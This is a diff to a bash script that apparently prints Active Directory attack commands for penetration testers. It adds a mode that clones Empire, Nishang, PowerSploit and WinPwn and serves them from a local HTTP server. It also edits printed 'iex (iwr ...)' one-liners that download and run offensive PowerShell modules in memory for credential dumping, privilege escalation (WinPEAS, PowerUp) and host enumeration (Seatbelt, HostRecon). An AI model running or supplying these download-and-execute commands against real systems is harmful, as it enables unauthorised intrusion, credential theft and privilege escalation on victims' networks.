@@ -8,17 +8,20 @@ set -o pipefail
 # Variables                                                                    #
 ################################################################################
 
-Username="";	#
-NQUsername="";	#
-Password="";	#
-Domain="";	#
-NQDomain="";	#
-IP="";		#
-NQIP="";	#
-LDAP="";	#
-baseLDAP="";	#
-DC="";		#
-NS="IP";	#
+LocalIP="192.168.254.190";	#
+LocalPort="8085";		#
+
+Username="";			#
+NQUsername="";			#
+Password="";			#
+Domain="";			#
+NQDomain="";			#
+IP="";				#
+NQIP="";			#
+LDAP="";			#
+baseLDAP="";			#
+DC="";				#
+NS="IP";			#
 
 EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
@@ -31,12 +34,13 @@ iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
 
 ################################################################################
-# Prerequisites                                                             #
+# Prerequisites                                                                #
 ################################################################################
 
 #ansi2html
 #seclists
 #Repo's
+
 
 
 ################################################################################
@@ -69,6 +73,37 @@ WHITE='\033[01;37m'
 
 IBLUE='\033[02;34m'
 ICYAN='\033[02;36m'
+
+################################################################################
+# Functions                                                                    #
+################################################################################
+
+Function_LocalRepo () {
+
+mkdir -p $HOME/ADAT
+mkdir -p $HOME/ADAT/LocalRepo
+cd $HOME/ADAT
+
+
+echo -e "${LGREEN}Cloning Empire Repo${RESTORE}"
+git clone --quiet --recursive https://github.com/BC-SECURITY/Empire.git &> /dev/null &
+echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
+git clone --quiet --recursive https://github.com/samratashok/nishang.git &> /dev/null &
+echo -e "${LGREEN}Cloning PowerSploit Repo${RESTORE}"
+git clone --quiet --recursive https://github.com/PowerShellMafia/PowerSploit.git &> /dev/null &
+echo -e "${LGREEN}Cloning WinPwn Repo${RESTORE}"
+git clone --recursive https://github.com/S3cur3Th1sSh1t/WinPwn.git &> /dev/null &
+
+
+cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
+
+python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
+
+
+}
 
 
 ################################################################################
@@ -119,24 +154,26 @@ while [ $# -gt 0 ]; do
                 shift
                 ;;
        
-        -c | --customrepo)
-                EmpireRepo="$2";
-		NishangRepo="$2";
-		PentestFactoryRepo="$2";
-		LazagneRepo="$2";
-		PowerSploitRepo="$2";
-		S3cur3Th1sSh1tRepo="$2";
-                shift
+        -L | --localrepo)
+                EmpireRepo="http://$LocalIP:$LocalPort/"
+		NishangRepo="http://$LocalIP:$LocalPort/"
+		PentestFactoryRepo="http://$LocalIP:$LocalPort/"
+		LazagneRepo="http://$LocalIP:$LocalPort/"
+		PowerSploitRepo="http://$LocalIP:$LocalPort/"
+		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
+		Function_LocalRepo;
                 shift
                 ;;
                                                                                                                                                       
                 
-        *)
-                POSITIONAL="${POSITIONAL} $1"
-                shift
-                ;;
+        #*)
+                #POSITIONAL="${POSITIONAL} $1"
+                #shift
+                #;;
         esac
 done
+
+
 
 ################################################################################
 # Banner                                                                     #
@@ -500,8 +537,8 @@ echo -e "${LRED}└────────────────────�
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "									  ${LGREEN}Credential Access${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
-# Credential Dumping
 echo -e ""
+# Credential Dumping
 echo -e "${LGREEN}Credential Dumping${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}LSASS Memory${RESTORE}"
@@ -553,12 +590,13 @@ echo -e ""
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "									  ${LGREEN}♠ Privilege Escalation ♠${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 # Tools
 echo -e "${LGREEN}Tools${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-WinPEAS.ps1);Invoke-WinPEAS"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
 echo -e ""
 echo -e "${IBLUE}PowerUp${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
@@ -579,13 +617,10 @@ echo -e ""
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "									${LGREEN}♠ Enumeration ♠${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 # Local Enumeration
 echo -e "${LGREEN}Local Enumeration${RESTORE}"
-echo -e ""
-echo -e "${IBLUE}Get-ComputerDetails${RESTORE}"
-echo -e "${LRED}WORK IN PROGRESS${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Get-ComputerDetails.ps1);Get-ComputerDetails -ToString"
 echo -e ""
 echo -e "${IBLUE}HostRecon${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
@@ -594,7 +629,6 @@ echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
 echo -e ""
 echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
-echo -e "${LRED}WORK IN PROGRESS${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
 echo -e ""
 echo -e ""
